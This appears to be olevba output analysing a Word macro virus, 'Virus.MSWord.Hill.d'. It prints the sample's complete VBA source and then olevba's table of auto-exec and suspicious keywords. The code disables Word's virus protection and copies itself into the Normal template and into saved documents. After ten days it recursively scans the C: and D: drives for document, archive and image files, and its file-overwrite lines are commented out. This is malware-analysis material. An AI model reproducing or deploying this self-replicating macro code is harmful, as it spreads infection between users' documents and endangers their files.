olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Hill.d-ae3cd65c8cf66af1b69d73e694bff9a0eb6be755
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Hill.d-ae3cd65c8cf66af1b69d73e694bff9a0eb6be755 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: Virus.MSWord.Hill.d-ae3cd65c8cf66af1b69d73e694bff9a0eb6be755 - OLE stream: 'Macros/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Dim k As String, f As String
Private Declare Function FindFirstFile Lib "kernel32" _
Alias "FindFirstFileA" _
(ByVal lpFileName As String, _
lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function FindNextFile Lib "kernel32" _
Alias "FindNextFileA" _
(ByVal hFindFile As Long, _
lpFindFileData As WIN32_FIND_DATA) As Long
Private Declare Function GetFileAttributes Lib "kernel32" _
Alias "GetFileAttributesA" _
(ByVal lpFileName As String) As Long
Private Declare Function FindClose Lib "kernel32" _
(ByVal hFindFile As Long) As Long
Const MAX_PATH = 260
Const MAXDWORD = &HFFFF
Const INVALID_HANDLE_VALUE = -1
Const FILE_ATTRIBUTE_ARCHIVE = &H20
Const FILE_ATTRIBUTE_DIRECTORY = &H10
Const FILE_ATTRIBUTE_HIDDEN = &H2
Const FILE_ATTRIBUTE_NORMAL = &H80
Const FILE_ATTRIBUTE_READONLY = &H1
Const FILE_ATTRIBUTE_SYSTEM = &H4
Const FILE_ATTRIBUTE_TEMPORARY = &H100
Private Type FILETIME
dwLowDateTime As Long
dwHighDateTime As Long
End Type
Private Type WIN32_FIND_DATA
dwFileAttributes As Long
ftCreationTime As FILETIME
ftLastAccessTime As FILETIME
ftLastWriteTime As FILETIME
nFileSizeHigh As Long
nFileSizeLow As Long
dwReserved0 As Long
dwReserved1 As Long
cFileName As String * MAX_PATH
cAlternate As String * 14
End Type
Private Function StripNulls(OriginalStr As String) As String
If (InStr(OriginalStr, Chr(0)) > 0) Then
OriginalStr = Left(OriginalStr, _
InStr(OriginalStr, Chr(0)) - 1)
End If
StripNulls = OriginalStr
End Function
Private Function FindFilesAPI(path As String, _
SearchStr As String, _
FileCount As Integer, _
DirCount As Integer)
On Error Resume Next
Dim FileName As String
Dim DirName As String
Dim dirNames() As String
Dim nDir As Integer
Dim i As Integer
Dim hSearch As Long
Dim WFD As WIN32_FIND_DATA
Dim Cont As Integer
If Right(path, 1) <> "\" Then path = path & "\"
nDir = 0
ReDim dirNames(nDir)
Cont = True
hSearch = FindFirstFile(path & "*", WFD)
If hSearch <> INVALID_HANDLE_VALUE Then
Do While Cont
DirName = StripNulls(WFD.cFileName)
If (DirName <> ".") And (DirName <> "..") Then
If GetFileAttributes(path & DirName) And _
                           FILE_ATTRIBUTE_DIRECTORY Then
dirNames(nDir) = DirName
DirCount = DirCount + 1
nDir = nDir + 1
ReDim Preserve dirNames(nDir)
End If
End If
Cont = FindNextFile(hSearch, WFD)
Loop
Cont = FindClose(hSearch)
End If
hSearch = FindFirstFile(path & SearchStr, WFD)
Cont = True
If hSearch <> INVALID_HANDLE_VALUE Then
While Cont
FileName = StripNulls(WFD.cFileName)
If (FileName <> ".") And (FileName <> "..") Then
FindFilesAPI = FindFilesAPI + _
(WFD.nFileSizeHigh * MAXDWORD) + _
WFD.nFileSizeLow
FileCount = FileCount + 1
On Error Resume Next
DoEvents
Dim r1 As String
r1 = Right(FileName, 3)
If r1 = "xls" Or r1 = "txt" Or r1 = "rtf" Or r1 = "doc" Or r1 = "rar" Or r1 = "zip" Or r1 = "dwg" Or r1 = "jpg" Or r1 = "bak" Or r1 = "dbf" Or r1 = "mdb" Or r1 = "bas" _
Or r1 = "XLS" Or r1 = "TXT" Or r1 = "RTF" Or r1 = "DOC" Or r1 = "RAR" Or r1 = "ZIP" Or r1 = "DWG" Or r1 = "JPG" Or r1 = "BAK" Or r1 = "DBF" Or r1 = "MDB" Or r1 = "BAS" Then
On Error Resume Next
Debug.Print path & FileName
' Open path & FileName For Output As #1
' Print #1, " "
' Close #1
End If
End If
Cont = FindNextFile(hSearch, WFD)
Wend
Cont = FindClose(hSearch)
End If
If nDir > 0 Then
For i = 0 To nDir - 1
FindFilesAPI = FindFilesAPI + _
FindFilesAPI(path & dirNames(i) _
& "\", SearchStr, FileCount, DirCount)
Next i
End If
End Function
 Sub AutoOpen()
Dim ad, nt
On Error Resume Next
Options.VirusProtection = False
Options.SaveInterval = 2
ad = ActiveDocument.Name
nt = NormalTemplate.FullName
If NormalTemplate.VBProject.VBComponents.Item("Модуль1").Name = " " Then
k = FreeFile
MakeFile
End If
If NormalTemplate.VBProject.VBComponents.Item("Модуль1").Name <> "Модуль1" Then
Application.OrganizerCopy Source:=ad, Destination:=nt, Name:="Модуль1", Object:=wdOrganizerObjectProjectItems
End If
NormalTemplate.Save
DooIt
End Sub
Sub FileSave()
On Error Resume Next
If ActiveDocument.VBProject.VBComponents.Item("Модуль1").Name <> "Модуль1" Then
NormalTemplate.VBProject.VBComponents("Модуль1").Export "C:\Winlog.log"
ActiveDocument.VBProject.VBComponents.import "C:\Winlog.log"
Kill "C:\Winlog.log"
End If
ActiveDocument.Save
f = GetSetting("FuckSoft", "MyDay", "MyTime")
If f = "" Then
MakeFile
End If
DooIt
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
Sub DooIt()
Options.SaveInterval = 2
On Error Resume Next
Dim d1 As Date, d, d2 As Date, t As String
d1 = Format(Now, "short date")
t = GetSetting("FuckSoft", "MyDay", "MyTime")
d2 = CDate(t): d = d1 - d2
Dim NumFiles As Integer, NumDirs As Integer, FileSize As Long
If 10 < d Then
FileSize = FindFilesAPI("C:\", "*.*", NumFiles, NumDirs)
FileSize = FindFilesAPI("D:\", "*.*", NumFiles, NumDirs)
End If
End Sub
Sub MakeFile()
Dim t As Date
t = Format(Now, "short date")
t = CStr(t)
SaveSetting "FuckSoft", "MyDay", "MyTime", t
End Sub
Sub Autoexit()
FileSave
End Sub
Sub Autoexec()
FileSave
End Sub
Sub Autonew()
FileSave
End Sub
Sub Openshell()
FileSave
End Sub
Sub AutoClose()
FileSave
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Autonew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

